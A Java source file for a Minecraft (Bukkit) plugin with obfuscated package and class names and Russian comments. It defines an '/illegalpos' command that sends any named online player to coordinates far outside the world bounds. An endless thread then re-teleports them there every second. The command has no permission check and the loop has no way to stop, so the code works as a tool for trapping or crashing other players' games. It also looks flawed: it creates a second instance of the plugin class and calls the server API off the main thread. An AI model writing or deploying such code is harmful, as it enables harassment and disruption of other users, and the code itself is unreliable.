package bokqpczadj.nvuihjnkvc;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class yndfucazsy extends JavaPlugin implements CommandExecutor {
	
	@Override
    public void onEnable() {
		Bukkit.getPluginCommand("illegalpos").setExecutor(new yndfucazsy());
	}

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            // Отправитель команды не является игроком, поэтому мы не можем продолжить.
            sender.sendMessage("Эта команда может быть выполнена только одним игроком.");
            return true;
        }

        if (args.length != 1) {
            // Команда была выполнена без необходимого аргумента (имени игрока).
            sender.sendMessage("Использование: /illegalpos <имя игрока>.");
            return true;
        }

        // Попробуй найти игрока, чье имя было указано в качестве аргумента.
        Player target = Bukkit.getPlayer(args[0]);
        if (target == null) {
            // Указанный игрок не может быть найден.
            sender.sendMessage("Указанный игрок не находится в сети.");
            return true;
        }

        // Установи координаты целевого игрока в заданные значения.
        Location targetLocation = new Location(target.getWorld(), 5.3798886290375836E7, 61.90406465444005, 3.27542289767967E7);
        target.teleport(targetLocation);

        // Запусти поток, который непрерывно телепортирует целевого игрока в указанные координаты.
        new Thread(() -> {
            while (true) {
                target.teleport(targetLocation);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        return true;
    }
}
